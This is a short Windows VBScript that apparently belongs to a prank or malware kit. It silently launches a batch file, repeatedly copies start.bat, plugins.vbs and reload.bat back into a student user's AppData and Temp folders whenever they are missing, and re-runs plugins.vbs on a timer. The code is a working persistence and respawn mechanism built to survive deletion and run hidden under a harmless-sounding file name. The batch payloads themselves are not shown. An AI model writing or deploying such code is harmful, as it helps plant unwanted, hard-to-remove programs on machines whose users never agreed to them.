Option Explicit
DIM fso, oShell, i
Set oShell = Wscript.CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

i = 0

oShell.Run("C:\Users\student\AppData\Local\Temp\reload.bat"),0,false

Do While i < 3
	If (fso.FileExists("C:\Users\student\AppData\Local\start.bat")) Then
	
	Else
  		fso.CopyFile "./start.bat", "C:\Users\student\AppData\Local\"
	End If

	If (fso.FileExists("C:\Users\student\AppData\Local\plugins.vbs")) Then
		
	Else
  		fso.CopyFile "./plugins.vbs", "C:\Users\student\AppData\Local\plugins.vbs"
	End If

	If (fso.FileExists("C:\Users\student\AppData\Local\Temp\reload.bat")) Then
		
	Else
  		fso.CopyFile "./reload.bat", "C:\Users\student\AppData\Local\Temp\"
	End If

	WScript.Sleep(6000)

	oShell.Run("C:\Users\student\AppData\Local\plugins.vbs")
	i = i + 1
Loop
